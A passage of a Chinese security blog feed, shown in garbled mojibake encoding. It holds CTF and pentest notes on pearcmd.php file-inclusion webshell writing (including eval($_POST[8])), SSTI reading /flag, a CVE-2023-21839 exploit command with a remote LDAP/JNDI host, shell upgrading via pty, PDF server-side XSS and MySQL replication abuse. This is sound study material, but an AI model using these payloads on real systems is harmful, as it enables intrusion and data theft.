<li>ä½¿ç”¨Java IIOP ORBå±æ€§ï¼šJava IIOP ORBå±æ€§æ˜¯ä¸€ç»„ç”¨äºé…ç½®IIOP ORBçš„å±æ€§ï¼Œ<code>åŒ…æ‹¬IPåœ°å€å’Œç«¯å£</code>ç­‰ã€‚å¯ä»¥åœ¨ä»£ç ä¸­è®¾ç½®è¿™äº›å±æ€§ï¼Œä»¥<code>ç¡®ä¿IIOPè¯·æ±‚å’Œå“åº”æ­£ç¡®åˆ°è¾¾ç›®æ ‡æœºå™¨å’Œæºæœºå™¨</code>ã€‚</li>
<li>ä½¿ç”¨Java IIOPåå‘ä»£ç†ï¼š<code>Java IIOPåå‘ä»£ç†</code>æ˜¯ä¸€ç§ç”¨äºåœ¨å…¬å…±ç½‘ç»œä¸Šéƒ¨ç½²çš„IIOPæœåŠ¡å™¨ã€‚åå‘ä»£ç†å¯ä»¥å°†IIOP<code>è¯·æ±‚è½¬å‘åˆ°ç§æœ‰ç½‘ç»œä¸­çš„IIOPæœåŠ¡å™¨</code>ï¼Œä»¥<code>é¿å…åœ¨IIOPè¯·æ±‚å’Œå“åº”ä¸­ä½¿ç”¨IPåœ°å€</code>ã€‚Java IIOPåå‘ä»£ç†é€šå¸¸æ˜¯<code>åŸºäºJava IIOP ORB</code>å®ç°çš„ã€‚</li>
</ol>
</blockquote>
<blockquote>
<p>Goè¯­è¨€å¯ä»¥ä½¿ç”¨ä¸€äº›æŠ€æœ¯æ¥é‡å†™IIOPè§„åˆ™ï¼Œä»¥ç¡®ä¿IIOPåœ¨NATç½‘ç»œä¸­çš„æ­£ç¡®æ€§å’Œå¯é æ€§ã€‚ä»¥ä¸‹æ˜¯å‡ ç§GoæŠ€æœ¯ï¼š</p>
<ol>
<li>ä½¿ç”¨Go CORBAåº“ï¼š<code>Go CORBAåº“</code>æ˜¯ä¸€ç»„ç”¨äºCORBAå¼€å‘çš„Goè¯­è¨€åº“ã€‚å¯ä»¥ä½¿ç”¨Go CORBAåº“è¿æ¥åˆ°IIOPæœåŠ¡å™¨ï¼Œå¹¶é€šè¿‡CORBAå¯¹è±¡çš„<code>åç§°è§£ææ¥é¿å…åœ¨IIOPè¯·æ±‚å’Œå“åº”ä¸­ä½¿ç”¨IPåœ°å€</code>ã€‚è¿™æ ·å¯ä»¥å‡å°‘NATå¯¹IIOPè¯·æ±‚å’Œå“åº”çš„å½±å“ã€‚</li>
<li>ä½¿ç”¨Go IIOPåå‘ä»£ç†ï¼šGo IIOPåå‘ä»£ç†æ˜¯ä¸€ç§ç”¨äºåœ¨å…¬å…±ç½‘ç»œä¸Šéƒ¨ç½²çš„IIOPæœåŠ¡å™¨ã€‚<code>åå‘ä»£ç†å¯ä»¥å°†IIOPè¯·æ±‚è½¬å‘åˆ°ç§æœ‰ç½‘ç»œä¸­çš„IIOPæœåŠ¡å™¨</code>ï¼Œä»¥é¿å…åœ¨IIOPè¯·æ±‚å’Œå“åº”ä¸­ä½¿ç”¨IPåœ°å€ã€‚Go IIOPåå‘ä»£ç†é€šå¸¸æ˜¯åŸºäºGo CORBAåº“å®ç°çš„ã€‚</li>
<li>ä½¿ç”¨Go TCPä»£ç†ï¼šGo TCPä»£ç†æ˜¯ä¸€ç§ç”¨äºåœ¨å…¬å…±ç½‘ç»œä¸Šéƒ¨ç½²çš„TCPæœåŠ¡å™¨ã€‚å¯ä»¥å°†<code>IIOPè¯·æ±‚å’Œå“åº”é€šè¿‡TCPä»£ç†ä¼ è¾“</code>ï¼Œå¹¶åœ¨ä»£ç†æœåŠ¡å™¨ä¸Š<code>è¿›è¡Œåœ°å€è½¬æ¢</code>ï¼Œä»¥<code>ç¡®ä¿IIOPè¯·æ±‚å’Œå“åº”</code>æ­£ç¡®åˆ°è¾¾ç›®æ ‡æœºå™¨å’Œæºæœºå™¨ã€‚</li>
</ol>
</blockquote>
<p>å¯ä»¥ä»¥å®é™…çš„æƒ…å†µç”¨ä¸åŒè¯­è¨€å’Œæ–¹æ³•è¿›è¡Œä¿®æ”¹ä»¥è¾¾åˆ°iiopä¸netå†²çªå‡å°‘æˆ–è€…æ¶ˆå¤±çš„ç›®çš„</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>daily</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬”è®°</title>
    <url>//post/Notes/</url>
    <content><![CDATA[<p><code>å…³é”®ç¬”è®°ï¼Œä¸»è¦æ€»ç»“æ¯”èµ›ä¸­é‡åˆ°çš„</code></p>
<span id="more"></span>

<h1 id="pearcmd-phpçš„å·§å¦™åˆ©ç”¨"><a href="#pearcmd-phpçš„å·§å¦™åˆ©ç”¨" class="headerlink" title="pearcmd.phpçš„å·§å¦™åˆ©ç”¨"></a><code>pearcmd.php</code>çš„å·§å¦™åˆ©ç”¨</h1><blockquote>
<p>æ¥è‡ªPç¥åšå®¢</p>
<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
</blockquote>
<p>å°±æ˜¯åˆ©ç”¨<code>pearcmd.php</code>è¿™ä¸ª<code>pecl/pear</code>ä¸­çš„æ–‡ä»¶ã€‚</p>
<p><code>pecl</code>æ˜¯<code>PHP</code>ä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œ<code>pear</code>æ˜¯<code>pecl</code>ä¾èµ–çš„ç±»åº“ã€‚åœ¨<code>7.3</code>åŠä»¥å‰ï¼Œ<code>pecl/pear</code>æ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨<code>7.4</code>åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘<code>PHP</code>çš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p>
<p>ä¸è¿‡ï¼Œåœ¨<code>Docker</code>ä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œ<code>pcel/pear</code>éƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p>
<blockquote>
<p>åŸæœ¬pear&#x2F;pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚</p>
</blockquote>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?+</span>config-create+<span class="regexp">/&amp;file=/usr</span><span class="regexp">/local/lib</span><span class="regexp">/php/pearcmd</span>.php&amp;<span class="regexp">/&lt;?=phpinfo()?&gt;+/tmp</span><span class="regexp">/hello.php</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>#config-createï¼Œé˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­</p>
</blockquote>
<p>å‘é€æ•°æ®åŒ…ï¼Œç›®æ ‡å°†ä¼šå†™å…¥ä¸€ä¸ªæ–‡ä»¶<code>/tmp/hello.php</code>ï¼Œå…¶å†…å®¹åŒ…å«<code>&lt;?=phpinfo()?&gt;</code></p>
<blockquote>
<p><code>/tmp/hello.php</code><br>å½“ç„¶ä¹Ÿå¯ä»¥æ”¹æˆ<code>/var/html/www</code>ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è¯»å–ï¼Œä¸ç”¨åˆ©ç”¨æ–‡ä»¶åŒ…å«å‚æ•°è¿›è¡Œå¯¹<code>/tmp/hello.php</code>è¯»å–</p>
<p>åªæ˜¯æ”¾åœ¨<code>/tmp</code>ä¸‹ä¸å®¹æ˜“è§¦å‘é˜²ç«å¢™è¢«åˆ é™¤</p>
</blockquote>
<p>åˆ©ç”¨æ–‡ä»¶åŒ…å«å­˜åœ¨ï¼Œå†åŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„ä¿¡æ¯</p>
<blockquote>
<p><code>&lt;?=phpinfo()?&gt;</code><br>ä¹Ÿå¯ä»¥æ”¹å†™æˆ<br><code>&lt;?=eval($_POST[8]);&gt;</code><br>è¿™æ ·å°±å¯ä»¥æ‰§è¡Œæ›´å¤šçš„å‘½ä»¤äº†</p>
</blockquote>
<h1 id="libmbflæ‰“åˆ†"><a href="#libmbflæ‰“åˆ†" class="headerlink" title="libmbflæ‰“åˆ†"></a>libmbflæ‰“åˆ†</h1><blockquote>
<p>æ‰€ä»¥å®ç°<code>$charset == BASE64</code>ï¼Œåªè¦æ–‡ä»¶å†…å®¹å‰é¢æ•°æ®è®©å®ƒè¯†åˆ«ä¸ºbase64å³å¯</p>
<p>é‚£ä¹ˆå¦‚ä½•è®©å…¶è®¤ä¸ºæ˜¯base64å‘¢ï¼Ÿ</p>
<p>è¿™å°±æ¶‰åŠåˆ°<code>libmbfl</code>çš„æ‰“åˆ†ï¼Œ<code>libmbfl</code>æ˜¯<code>mb</code>æ‰©å±•</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>æˆ‘çš„ç†è§£å°±æ˜¯ç±»ä¼¼åƒ<code>checkengine</code>ï¼Œæ¯”å¦‚<code>mb_detect_encoding()</code>è¿™ç±»çš„å‡½æ•°å¯¹å†…å®¹è¿›è¡Œç¼–ç çš„è¯†åˆ«ï¼Œå°±æ˜¯<code>åŒ¹é…å†…å®¹ä¸­çš„ä¸€äº›ç¬¦åˆç¼–ç çš„å­—ç¬¦ï¼ŒåŒ¹é…æˆåŠŸå¯¹åº”ç¼–ç åŠ åˆ†</code>ï¼Œæœ€åä»å¤´åˆ°å°¾åŒ¹é…å®Œæˆåï¼Œ<code>æ‰“åˆ†æœ€é«˜çš„ç¼–ç å°±è¢«è®¤ä¸ºæ˜¯è¯¥å†…å®¹çš„ç¼–ç </code></p>
</blockquote>
<p>è¿™æ˜¯æ‰“åˆ†åˆ¤æ–­</p>
<blockquote>
<p>0xFFFFæ˜¯-1ï¼Œ&gt;&#x3D;0 </p>
<blockquote>
<p>0x21æ˜¯33 33å¯¹åº”!</p>
<p>0x2Fæ˜¯47 47å¯¹åº”&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>æ‰“åˆ†æ‰“çš„å¤š</p>
</blockquote>
<h1 id="Tomcatä»¥-ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–"><a href="#Tomcatä»¥-ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–" class="headerlink" title="Tomcatä»¥;ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–"></a>Tomcatä»¥;ä¸€ç§å¥‡æ€ªçš„æ–¹å¼è¿›è¡Œè§„èŒƒåŒ–</h1><blockquote>
<p><code>;</code>åçš„æ•°æ®ä¸è§£æ</p>
<p>å³å¯<code>http://127.0.0.1/index;123.ico</code>ï¼Œè¯»å–æ—¶åªè§†ä¸º<code>http://127.0.0.1/index</code></p>
</blockquote>
<h1 id="æœåŠ¡å™¨ç«¯XSSã€é’ˆå¯¹äºåŠ¨æ€PDFã€‘"><a href="#æœåŠ¡å™¨ç«¯XSSã€é’ˆå¯¹äºåŠ¨æ€PDFã€‘" class="headerlink" title="æœåŠ¡å™¨ç«¯XSSã€é’ˆå¯¹äºåŠ¨æ€PDFã€‘"></a>æœåŠ¡å™¨ç«¯XSSã€é’ˆå¯¹äºåŠ¨æ€PDFã€‘</h1><blockquote>
<p><code>https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdfhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</code></p>
</blockquote>
<p>è¿˜æ˜¯ä»htbçš„æœºå™¨å­¦ä¹ åˆ°çš„</p>
<blockquote>
<p>æ¯”å¦‚ï¼Œåœ¨ä¸€äº›è´­ç‰©ç½‘ç«™è®¢å•ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŠ¨æ€çš„pdfæ–¹ä¾¿æ‰“å°ä½œä¸ºæŠ¥é”€çš„å‡­è¯ï¼Œ</p>
<p>ä½†æ˜¯è™½ç„¶çœ‹èµ·åƒæ˜¯pdfï¼Œä½†æœ¬è´¨è¿˜æ˜¯htmlç½‘ç«™ã€‚æ‰å¯ä»¥å®ç°åŠ¨æ€ï¼Œè€Œå…¶ä¸­çš„æ•°æ®ä¹Ÿæ˜¯å®¢æˆ·ç«¯ä¼ å‘æœåŠ¡å™¨ç”Ÿæˆ</p>
<p>é‚£ä¹ˆå¦‚æœä¼ å‘æœåŠ¡å™¨è¿›è¡ŒåŠ¨æ€pdfç”Ÿæˆçš„æ•°æ®è¢«ç”¨æˆ·æ§åˆ¶ï¼Œå¯¼è‡´æœ€åç”Ÿæˆçš„pdfä¸­çš„æ•°æ®è¿”å›ä¸€äº›æœåŠ¡å™¨çš„æ•æ„Ÿçš„æ•°æ®ï¼Œå°±ä¼šéå¸¸å±é™©</p>
</blockquote>
<blockquote>
<p>å¦‚æœç½‘é¡µä½¿ç”¨ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥åˆ›å»º PDFï¼Œæ‚¨å¯ä»¥å°è¯•è¯±éª—åˆ›å»º PDF çš„æœºå™¨äººæ‰§è¡Œä»»æ„ JS ä»£ç ã€‚ å› æ­¤ï¼Œå¦‚æœ PDF åˆ›å»ºè€…æœºå™¨äººæ‰¾åˆ°æŸç§ HTML æ ‡è®°ï¼Œå®ƒå°†è§£é‡Šå®ƒä»¬ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨æ­¤è¡Œä¸º<code>å¯¼è‡´æœåŠ¡å™¨ XSS</code>ã€‚</p>
</blockquote>
<p>è¯·æ³¨æ„ï¼Œ<code>&lt;script&gt;&lt;/script&gt;</code> æ ‡ç­¾å¹¶ä¸æ€»æ˜¯æœ‰æ•ˆï¼Œå› æ­¤æ‚¨éœ€è¦ä¸åŒçš„æ–¹æ³•æ¥æ‰§è¡Œ JSï¼ˆä¾‹å¦‚ï¼Œæ»¥ç”¨ <code>&lt;img</code>,<code>&lt;iframe&gt;</code>ï¼‰ã€‚ </p>
<p>å¦å¤–ï¼Œè¯·æ³¨æ„ï¼Œåœ¨å¸¸è§„åˆ©ç”¨ä¸­ï¼Œæ‚¨å°†èƒ½å¤Ÿ<strong>æŸ¥çœ‹&#x2F;ä¸‹è½½åˆ›å»ºçš„pdf</strong>ï¼Œå› æ­¤æ‚¨å°†èƒ½å¤Ÿçœ‹åˆ°<code>é€šè¿‡JSç¼–å†™çš„æ‰€æœ‰å†…å®¹</code>ï¼ˆä¾‹å¦‚ä½¿ç”¨<code>document.writeï¼ˆï¼‰</code>ï¼‰ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæ‚¨<strong>çœ‹ä¸åˆ°</strong>åˆ›å»ºçš„PDFï¼Œåˆ™å¯èƒ½éœ€è¦<strong>æå–ä¿¡æ¯ï¼Œä»è€Œå‘æ‚¨å‘å‡ºWebè¯·æ±‚</strong>ï¼ˆç›²å†™ï¼Œç„¶åçœ‹å›æ˜¾çŒœæµ‹ï¼‰ã€‚</p>
<h1 id="è·å¾—ç¨³å®šçš„shell"><a href="#è·å¾—ç¨³å®šçš„shell" class="headerlink" title="è·å¾—ç¨³å®šçš„shell"></a>è·å¾—ç¨³å®šçš„shell</h1><p>ã€ä¸ä¼šå› ä¸ºctrl+cé€€å‡ºï¼Œè€Œä¸”å¯ä»¥æŒ‰ä¸Šä¸‹é”®ï¼Œè¿”å›ä¹‹å‰çš„å‘½ä»¤ã€‘</p>
<blockquote>
<ol>
<li><p><strong>python -c â€˜import pty;pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™</strong> æˆ–è€…</p>
<p>**python3 -c â€˜import pty;pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™**è¿›å…¥äº¤äº’å¼shell</p>
</li>
<li><p><code>Ctrl-Z</code>å°†shellæ”¾åˆ°åå°</p>
</li>
<li><p><code>stty raw -echo ; fg ; reset</code></p>
</li>
</ol>
<p>&#x2F;&#x2F;stty è®¾ç½®ç»ˆç«¯ç«¯å£è®¾å¤‡çš„æ¥å£é€‰é¡¹</p>
<p>&#x2F;&#x2F;echo è¡¨ç¤ºå›æ˜¾ï¼Œæ¯”å¦‚å½“-echoæ—¶ï¼Œè¾“å…¥lsåæŒ‰å›è½¦ï¼Œä»ç„¶ä¼šçœ‹åˆ°ls</p>
<p>&#x2F;&#x2F;fgæŠŠshellæåˆ°å‰å°æ¥</p>
<p>&#x2F;&#x2F;resetè¡¨ç¤ºé‡å¯ç»ˆç«¯ï¼Œæ­¤æ—¶çš„ç»ˆç«¯ä¸ºæˆ‘ä»¬é¶æœºçš„shellçª—å£ï¼Œæ‰€ä»¥ä¸å®¹æ˜“è¢«é€€å‡ºæˆ–è€…ä¸­æ–­</p>
</blockquote>
<p><img src="/post/Notes/image-20221002145951718.png" alt="image-20221002145951718"></p>
<p>æˆåŠŸè·å¾—å…¨äº¤äº’å¼<code>shell</code></p>
<h1 id="T3åè®®çš„ååºåˆ—åŒ–æ”»å‡»"><a href="#T3åè®®çš„ååºåˆ—åŒ–æ”»å‡»" class="headerlink" title="T3åè®®çš„ååºåˆ—åŒ–æ”»å‡»"></a>T3åè®®çš„ååºåˆ—åŒ–æ”»å‡»</h1><p>è¿™æ˜¯åœ¨å¤ç°CVE-2023-21839æ—¶ï¼ŒæŸ¥çœ‹å…¶åˆ©ç”¨çš„åŸºæœ¬åŸç†T3&#x2F;æ—¶çœ‹åˆ°çš„</p>
<p><a href="https://www.cnblogs.com/unicodeSec/p/14378757.html">å­¦ä¹ æ–‡ç« </a></p>
<h1 id="è®°ç¬¬ä¸€æ¬¡å…¬ç½‘æµ‹è¯•"><a href="#è®°ç¬¬ä¸€æ¬¡å…¬ç½‘æµ‹è¯•" class="headerlink" title="è®°ç¬¬ä¸€æ¬¡å…¬ç½‘æµ‹è¯•"></a>è®°ç¬¬ä¸€æ¬¡å…¬ç½‘æµ‹è¯•</h1><p>æ¯”å¦‚ï¼Œåœ¨å¤ç°cve-2023-21839æ—¶</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">./web.exe -<span class="built_in">ip</span> å…¬ç½‘<span class="built_in">ip</span> -port <span class="number">7001</span> -ldap ldap:<span class="comment">//å¦ä¸€ä¸ªå…¬ç½‘ipï¼ˆæŒ‚è€…jndiï¼‰:1389/xx</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³åœ¨æœ¬æœºè¿›è¡Œå¤ç°ï¼Œéœ€è¦è®©è‡ªå·±çš„ipå˜æˆå¯ä»¥è¢«å…¬ç½‘è®¿é—®çš„ipï¼Œåœ¨ä¸Šé¢è¿›è¡Œæ‰“å¼€ldapï¼Œä»¥åŠæŒ‚ä¸Šæ¶æ„ç±»ï¼Œå¦åˆ™åªèƒ½æœ¬åœ°æµ‹è¯•</p>
<h1 id="file-bè§£æ-åå†…å®¹æ˜¾ç¤º"><a href="#file-bè§£æ-åå†…å®¹æ˜¾ç¤º" class="headerlink" title="file -bè§£æ#!åå†…å®¹æ˜¾ç¤º"></a>file -bè§£æ#!åå†…å®¹æ˜¾ç¤º</h1><p>è¿™é‡Œå°±éœ€è¦ä¸€ä¸ªçŸ¥è¯†ç‚¹<code>#!</code>åçš„å†…å®¹ï¼Œä¼šè¢«è§†ä¸ºæ–‡ä»¶çš„è§£é‡Šå™¨ï¼Œç„¶åæ‰“å°å‡ºæ¥ï¼Œæ¯”å¦‚</p>
<p><img src="/post/Notes/image-20230312224705119.png" alt="image-20230312224705119"></p>
<p>è¿™é‡Œ</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">a </span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> script, ASCII text executable</span></span><br></pre></td></tr></table></figure>

<p>å°±çœ‹å‡ºæ¥å®ƒæŠŠæ–‡æœ¬</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å½“ä½œäº†<code>script</code>è§£æå™¨ï¼Œåœ¨è§£ææ–‡ä»¶ç±»å‹æ—¶ï¼Œå°±æŠŠå®ƒæ‰“å°å‡ºæ¥äº†</p>
<p>äºæ˜¯æˆ‘ä»¬ä¸Šä¼ è¯¥æ–‡ä»¶</p>
<p><img src="/post/Notes/image-20230312224941575.png" alt="image-20230312224941575"></p>
<p>å¾—åˆ°flag</p>
<h1 id="straceå‘½ä»¤"><a href="#straceå‘½ä»¤" class="headerlink" title="straceå‘½ä»¤"></a>straceå‘½ä»¤</h1><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œstraceå‘½ä»¤æ˜¯ä¸€ä¸ªé›†è¯Šæ–­ã€è°ƒè¯•ã€ç»Ÿè®¡ä¸ä¸€ä½“çš„å·¥å…·ï¼Œå¯ç”¨æ¥è¿½è¸ªè°ƒè¯•ç¨‹åºï¼Œèƒ½å¤Ÿä¸å…¶ä»–å‘½ä»¤æ­é…ä½¿ç”¨ã€‚</p>
<p>åœ¨Linuxä¸–ç•Œï¼Œ<code>è¿›ç¨‹ä¸èƒ½ç›´æ¥è®¿é—®ç¡¬ä»¶è®¾å¤‡</code>ï¼Œå½“è¿›ç¨‹éœ€è¦è®¿é—®ç¡¬ä»¶è®¾å¤‡ (æ¯”å¦‚è¯»å–ç£ç›˜æ–‡ä»¶ï¼Œæ¥æ”¶ç½‘ç»œæ•°æ®ç­‰ç­‰)æ—¶ï¼Œå¿…é¡»ç”±ç”¨æˆ·æ€æ¨¡å¼åˆ‡æ¢è‡³å†…æ ¸æ€æ¨¡å¼ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨è®¿é—®ç¡¬ä»¶è®¾å¤‡ã€‚<code>straceå¯ä»¥è·Ÿè¸ªåˆ°ä¸€ä¸ªè¿›ç¨‹äº§ç”Ÿçš„ç³»ç»Ÿè°ƒç”¨,åŒ…æ‹¬å‚æ•°ï¼Œè¿”å›å€¼ï¼Œæ‰§è¡Œæ¶ˆè€—çš„æ—¶é—´ã€‚</code></p>
<p>è€Œå¯¹äºä¸€äº›å‘½ä»¤è€Œè¨€ä¹Ÿå¯ä»¥ç›‘æ§å…¶è°ƒç”¨çš„ä¸€äº›æ–‡ä»¶ä¿¡æ¯</p>
<p>æ¯”å¦‚</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">strace <span class="regexp">/bin/</span><span class="keyword">file</span></span><br><span class="line">#æŸ¥è¯¢<span class="keyword">file</span>å‘½ä»¤æ‰§è¡Œéœ€è¦è°ƒç”¨çš„æ–‡ä»¶ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p><img src="/post/Notes/image-20230330210854308.png" alt="image-20230330210854308"></p>
<p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†ä¸€ä¸ª<code>/etc/ld.so.preload</code>æ–‡ä»¶</p>
<p><img src="/post/Notes/image-20230330211853378.png" alt="image-20230330211853378"></p>
<h1 id="Mysqlä¸»ä»å¤åˆ¶"><a href="#Mysqlä¸»ä»å¤åˆ¶" class="headerlink" title="Mysqlä¸»ä»å¤åˆ¶"></a>Mysqlä¸»ä»å¤åˆ¶</h1><blockquote>
<p>ä¸»ä»å¤åˆ¶çš„åŸºç¡€æ˜¯ä¸»æœåŠ¡å™¨å¯¹æ•°æ®åº“ä¿®æ”¹è®°å½•äºŒè¿›åˆ¶æ—¥å¿—ï¼Œä»æœåŠ¡å™¨é€šè¿‡ä¸»æœåŠ¡å™¨çš„äºŒè¿›åˆ¶æ—¥å¿—è‡ªåŠ¨æ‰§è¡Œæ›´æ–°ï¼Œä¹Ÿå°±æ˜¯ä¸»åº“åªä¼ æ—¥å¿—ç»™ä»åº“ï¼Œä»åº“æ ¹æ®æ—¥å¿—æ‰§è¡Œå‘½</p>
<p>[å­¦ä¹ æ–‡ç« ]</p>
<p>ä½œè€…ï¼šå°ç†Šæˆ‘ä¸è¦äº†<br>é“¾æ¥ï¼š<a href="https://juejin.cn/post/6844903921677238285">https://juejin.cn/post/6844903921677238285</a></p>
</blockquote>
<p>åœ¨æŸæ¯”èµ›é‡åˆ°çš„ï¼Œä¸€ä¸ª<code>sql</code>æ³¨å…¥ç¯å¢ƒï¼Œå¯¹è¯­å¥è¿‡æ»¤å¾ˆå¤šï¼Œä¹ŸåŒ…æ‹¬<code>selectã€updatexml</code>ç­‰ç­‰å¸¸ç”¨çš„è¯­å¥ã€‚</p>
<p>ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤<code>showï¼Œslaveï¼Œchange</code>ç­‰è¯­å¥</p>
<hr>
<p>è¯¥é¢˜éœ€è¦ä¸€ä¸ªç™»å½•ï¼Œæ˜¯åœ¨ä¸€ä¸ªphpè¯­å¥ä¸­</p>
<p>å¤§æ¦‚æ˜¯ä»ctfåº“ä¸­ï¼ŒæŸ¥è¯¢å…¶ä¸­çš„adminè¡¨ï¼ŒåŒ¹é…å…¶ä¸­ç”¨æˆ·åå’Œå¯†ç </p>
<p>ä½†æ˜¯ctfåº“ï¼Œåˆ©ç”¨<code>show tables in ctf;</code>å‘ç°æ˜¯ä¸€ä¸ªç©ºåº“ï¼Œè¿è¡¨ä¹Ÿæ²¡æœ‰ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥ç™»å½•æ”¹æ ¹æœ¬ä¸è¡Œï¼Œéœ€è¦ä¿®æ”¹å®ƒçš„æ•°æ®åº“ï¼Œæ·»åŠ ç”¨æˆ·ä¿¡æ¯</p>
<p><code>show variables like &#39;secure_file_priv&#39;;</code>æŸ¥çœ‹å…¶æœ‰æ²¡æœ‰å¯ä»¥è¢«è¯»å–æˆ–å†™å…¥çš„æ–‡ä»¶ï¼Œä¹Ÿæ˜¯ç©º</p>
<hr>
<p>æ‰€ä»¥æ ¹æ®ä¸»ä»å¤åˆ¶çš„æ€è·¯å°±æ˜¯ï¼Œæ”»å‡»æœºæ­å»ºä¸€ä¸ªæ•°æ®åº“ä½œä¸ºä¸»åº“ï¼Œè€Œç¯å¢ƒçš„æ•°æ®åº“å½“ä½œä»åº“ï¼Œä»è€Œå®ç°åœ¨æ”»å‡»ä¸Šè¿›è¡Œä¿®æ”¹ä½¿å¾—ä»åº“ã€ç¯å¢ƒæ•°æ®åº“ã€‘è¢«ä¿®æ”¹</p>
<p>ä¸ºä»€ä¹ˆä¼šæƒ³åˆ°åˆ©ç”¨ä¸»ä»å¤åˆ¶ï¼Œå…¶å®å¾ˆç®€å•ï¼Œè¿‡æ»¤äº†è¿™ä¹ˆå¤šï¼Œä½†æ˜¯æ‰§è¡Œ</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">show</span> slave <span class="built_in">status</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å›æ˜¾ï¼Œå¹¶ä¸”æ˜¾ç¤ºRunning</p>
<blockquote>
<p><strong>ä¸»ä»é…ç½®</strong></p>
<p>åœ¨ä¸»ä»é…ç½®ä¹‹å‰éœ€è¦ç¡®ä¿ä¸¤å°mysqléœ€è¦åŒæ­¥çš„åº“çŠ¶æ€ä¸€è‡´ã€‚</p>
</blockquote>
<h2 id="æ”»å‡»æœºã€ä¸»ã€‘"><a href="#æ”»å‡»æœºã€ä¸»ã€‘" class="headerlink" title="æ”»å‡»æœºã€ä¸»ã€‘"></a>æ”»å‡»æœºã€ä¸»ã€‘</h2><p>é…ç½®æ–‡ä»¶é»˜è®¤åœ¨<code>/etc/my.cnf</code>ä¸‹ã€‚</p>
<p>åœ¨é…ç½®æ–‡ä»¶ä¸­æ–°å¢é…ç½®ï¼š</p>
